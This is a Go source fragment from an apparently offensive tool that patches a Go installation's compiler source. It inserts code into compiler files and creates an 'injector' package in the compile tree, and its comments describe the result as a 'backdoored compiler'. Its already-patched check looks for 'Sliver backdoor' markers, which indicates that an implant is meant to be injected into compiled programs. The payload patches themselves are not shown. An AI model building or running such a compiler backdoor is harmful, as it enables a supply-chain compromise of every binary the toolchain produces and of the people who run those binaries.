// ApplyPatches applies all patches to the Go installation at goroot.
// After calling this, run `go install cmd/compile` to build the backdoored compiler.
func ApplyPatches(goroot string) error {
	for _, patch := range CompilerPatches {
		path := filepath.Join(goroot, "src", filepath.FromSlash(patch.File))
		if err := applyPatch(path, patch); err != nil {
			return fmt.Errorf("patch %s: %w", patch.File, err)
		}
		fmt.Printf("[+] Patched: %s\n", patch.File)
	}

	// Also copy our injector package into the compiler source tree.
	injectorDst := filepath.Join(goroot, "src", "cmd", "compile", "internal", "pkginit", "injector")
	if err := os.MkdirAll(injectorDst, 0755); err != nil {
		return fmt.Errorf("create injector dir: %w", err)
	}
	fmt.Printf("[+] Injector package directory created: %s\n", injectorDst)
	return nil
}

func applyPatch(filePath string, patch PatchSpec) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	src := string(data)

	// Check if already patched.
	if strings.Contains(src, "Sliver backdoor") || strings.Contains(src, "sliverInjectInit") {
		fmt.Printf("  [!] Already patched: %s\n", filePath)
		return nil
	}

	if patch.InsertAfter != "" {
		idx := strings.Index(src, patch.SearchText)
		if idx < 0 {
			return fmt.Errorf("search text not found: %q", patch.SearchText[:min(40, len(patch.SearchText))])
		}
		insertAt := idx + len(patch.InsertAfter)
		src = src[:insertAt] + "\n" + patch.NewCode + src[insertAt:]
	} else if patch.SearchText != "" {
		// Insert BEFORE the search text.
		idx := strings.Index(src, patch.SearchText)
		if idx < 0 {
			return fmt.Errorf("search text not found: %q", patch.SearchText[:min(40, len(patch.SearchText))])
		}
		src = src[:idx] + patch.NewCode + "\n" + src[idx:]
	} else {
		// Append to end of file.
		src = src + "\n" + patch.NewCode
	}

	return os.WriteFile(filePath, []byte(src), 0644)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
